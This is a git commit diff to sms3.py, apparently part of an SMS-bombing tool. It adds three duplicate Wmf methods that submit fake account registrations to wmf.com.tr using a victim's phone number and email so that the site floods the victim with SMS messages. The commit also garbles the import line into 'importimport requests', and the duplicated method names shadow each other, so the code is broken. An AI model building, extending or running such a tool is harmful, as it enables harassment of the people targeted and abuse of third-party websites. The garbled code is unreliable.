fb73082fc9dc2e5039091bf24d28eb3f75efef1f
enesalp99 <125455033+enesalp99@users.noreply.github.com>
2023-04-07 18:03:31 +0300

    Update sms3.py

--- sms3.py
+++ sms3.py
@@ -1,4 +1,4 @@
-import requests
+importimport requests
 from random import choice
 from string import ascii_lowercase
 from bs4 import BeautifulSoup
@@ -35,4 +35,69 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
-      
+
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
+                "confirm": "true",
+                "date_of_birth": "1986-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Mahmut",
+                "gender": "male",
+                "last_name": "Aktas",
+                "password": "31ABC..32c31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
+                "confirm": "true",
+                "date_of_birth": "1960-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Burak",
+                "gender": "male",
+                "last_name": "Tas",
+                "password": "31C..abc31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
+                "confirm": "true",
+                "date_of_birth": "1996-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Ufuk",
+                "gender": "male",
+                "last_name": "Bas",
+                "password": "31CC..abc31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
